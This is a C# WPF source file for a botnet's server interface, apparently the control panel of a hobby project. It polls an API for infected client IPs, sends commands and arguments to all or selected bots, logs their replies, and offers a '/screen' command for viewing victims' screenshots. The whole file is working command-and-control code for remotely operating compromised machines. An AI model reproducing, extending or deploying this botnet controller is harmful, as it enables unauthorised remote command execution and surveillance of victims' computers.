// This code is licensed under the isc license. You can improve the code by keeping this comments 
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using CommandsLibrary;

namespace BotNet_Server_UI
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public bool ipsall;
        public string[] ips;
        TextBox[] args = new TextBox[0];

        List<TextBox> textBoxes = new List<TextBox>();
        public MainWindow()
        {
            InitializeComponent();
        }

        private async void Send_Command()
        {
            if (Command.Text == "")
            {
                MessageBox.Show("Постарайтесь ввести все значения правильно!");
                return;
            }
            try
            {
                string showcommand = Command.Text;
                string command = Command.Text;
                for (int i = 0; i < args.Length; i++)
                {
                    showcommand += " " + args[i].Text;
                    command += "^" + args[i].Text;
                }
                Message message = new Message()
                {
                    command = command,
                    ip = ipsall ? ClientList.Text.Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray() : ips ?? new string[Convert.ToInt32(IPCount.Content.ToString())]
                };
                if (!ipsall && ips == null)
                {
                    for (int i = 0; i < message.ip.Length; i++)
                    {
                        message.ip[i] = textBoxes[i].Text;
                    }
                }
                Uri res = await ApiRequest.CreateProductAsync(message, "messages");
                LogPanel.Text += $"Команда {showcommand} (id: {await ApiRequest.GetProductAsync<uint>("api/v1/messages") - 1}) отправлена.\n";
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Send_Command();
        }

        private void Command_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                Send_Command();
            }
        }

        private async void Formloaded(object sender, RoutedEventArgs e)
        {
            _ = await ApiRequest.DeleteProductsAsync("api/v1/messages");
            _ = await ApiRequest.DeleteProductsAsync("api/v1/responses");
            textBoxes.Add(IP1);
            textBoxes.Add(IP2);
            textBoxes.Add(IP3);
            textBoxes.Add(IP4);
            textBoxes.Add(IP5);
            textBoxes.Add(IP6);
            textBoxes.Add(IP7);
            textBoxes.Add(IP8);
            textBoxes.Add(IP9);
            textBoxes.Add(IP10);
            textBoxes.Add(IP11);
            textBoxes.Add(IP12);
            textBoxes.Add(IP13);
            textBoxes.Add(IP14);
            textBoxes.Add(IP15);
            textBoxes.Add(IP16);
            textBoxes.Add(IP17);
            textBoxes.Add(IP18);
            textBoxes.Add(IP19);
            textBoxes.Add(IP20);
            textBoxes.Add(IP21);
            textBoxes.Add(IP22);
            textBoxes.Add(IP23);
            textBoxes.Add(IP24);
            textBoxes.Add(IP25);
            textBoxes.Add(IP26);
            textBoxes.Add(IP27);
            textBoxes.Add(IP28);
            UpdateTextBoxes();
            StartListenAsync();
        }

        private void Minus_Click(object sender, RoutedEventArgs e)
        {
            if (Convert.ToInt32(IPCount.Content.ToString()) == 1)
            {
                MessageBox.Show("Значение не может быть ниже 1 и выше 28");
                return;
            }
            IPCount.Content = Convert.ToInt32(IPCount.Content.ToString()) - 1;
            UpdateTextBoxes();
        }

        private void Plus_Click(object sender, RoutedEventArgs e)
        {
            if (Convert.ToInt32(IPCount.Content.ToString()) == 28)
            {
                MessageBox.Show("Значение не может быть ниже 1 и выше 28");
                return;
            }
            IPCount.Content = Convert.ToInt32(IPCount.Content.ToString()) + 1;
            UpdateTextBoxes();
        }

        private void UpdateTextBoxes()
        {
            for (int i = 0; i < textBoxes.Count; i++)
            {
                if (i < Convert.ToInt32(IPCount.Content.ToString()))
                {
                    textBoxes[i].Visibility = Visibility.Visible;
                }
                else
                {
                    textBoxes[i].Visibility = Visibility.Hidden;
                }
            }
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            StartListenAsync();
        }

        private async void StartListenAsync()
        {
            await Task.Run(() => ListenClients());
            await Task.Run(() => ListenResponses());
        }

        private async void ListenClients()
        {
            try
            {
                while (true)
                {
                    IP[] arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
                    if (arr == null)
                    {
                        continue;
                    }
                    string res = "";
                    for (int i = 0; i < arr.Length; i++)
                    {
                        if (arr[i].ip == "")
                        {
                            continue;
                        }
                        res += arr[i].ip + "\n";
                    }
                    await ClientList.Dispatcher.BeginInvoke(new Action(() => ClientList.Text = res));
                    Thread.Sleep(7000);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private async void ListenResponses()
        {
            try
            {
                bool isFirstIter = true;
                List<uint> vars = new List<uint>();
                while (true)
                {
                    Responses[] responses = await ApiRequest.GetProductAsync<Responses[]>("api/v1/responses");
                    if (responses == null)
                    {
                        continue;
                    }
                    if (isFirstIter)
                    {
                        isFirstIter = false;
                        for (int i = 0; i < responses.Length; i++)
                        {
                            vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1);
                        }
                    }
                    if (vars.Count != responses.Length)
                    {
                        for (int i = vars.Count; i < responses.Length; i++)
                        {
                            vars.Add(await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1);
                        }
                    }
                    for (int i = 0; i < responses.Length; i++)
                    {
                        uint var1 = await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1;
                        if (var1 == vars[i])
                        {
                            Response response = await ApiRequest.GetProductAsync<Response>($"api/v1/responses/{responses[i].ip}/{var1}");
                            if (response != null)
                            {
                                await LogPanel.Dispatcher.BeginInvoke(new Action(() => LogPanel.Text += response.response + "\n"));
                            }
                            vars[i] = vars[i] + 1;
                        }
                    }
                    Thread.Sleep(1000);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public void BlockTextIP()
        {
            Button_Minus.IsEnabled = false;
            Button_Plus.IsEnabled = false;
            for (int i = 0; i < textBoxes.Count; i++)
            {
                textBoxes[i].IsEnabled = false;
            }
        }

        public void UnblockTextIp()
        {
            Button_Minus.IsEnabled = true;
            Button_Plus.IsEnabled = true;
            for (int i = 0; i < textBoxes.Count; i++)
            {
                textBoxes[i].IsEnabled = true;
            }
        }
        private void IPSetButton_Click(object sender, RoutedEventArgs e)
        {
            IPSet iPSet = new IPSet();
            iPSet.Show();
        }
        private void Command_TextChanged(object sender, TextChangedEventArgs e)
        {
            for (int i = 0; i < Arguments.arguments.Length; i++)
            {
                if (Command.Text == Arguments.arguments[i].Command)
                {
                    if (Command.Text == "/screen")
                    {
                        Button button = new Button()
                        {
                            HorizontalAlignment = HorizontalAlignment.Stretch,
                            VerticalAlignment = VerticalAlignment.Bottom,
                            Height = 22,
                            Width = 270,
                            Margin = new Thickness(151, Application.Current.Windows[0].Height - 80, Application.Current.Windows[0].Width - 151 - 270, 11)
                        };
                        Grid.Children.Add(button);
                        button.Click += Button_Click1;
                    }
                    args = new TextBox[Arguments.arguments[i].ArgumentCount];
                    for (int j = 0; j < Arguments.arguments[i].ArgumentCount; j++)
                    {
                        args[j] = new TextBox()
                        {
                            Name = $"Argument{j + 1}",
                            TextWrapping = TextWrapping.Wrap,
                            VerticalAlignment = VerticalAlignment.Bottom,
                            HorizontalAlignment = HorizontalAlignment.Left,
                            Height = 22,
                            Width = 270 / Arguments.arguments[i].ArgumentCount,
                            Margin = new Thickness(151 + j * (270 / Arguments.arguments[i].ArgumentCount), Application.Current.Windows[0].Height - 80, Application.Current.Windows[0].Height - (151 + (Arguments.arguments[i].ArgumentCount - 1) * (270 / Arguments.arguments[i].ArgumentCount)), 11)
                        };
                        Grid.Children.Add(args[j]);
                        args[j].KeyDown += Command_KeyDown;
                    }
                    return;
                }
            }
            for (int i = 0; i < args.Length; i++)
            {
                Grid.Children.Remove(args[i]);
            }
        }

        private void Button_Click1(object sender, RoutedEventArgs e)
        {
            Screens screenwindow = new Screens();
            screenwindow.Show();
        }
    }
}
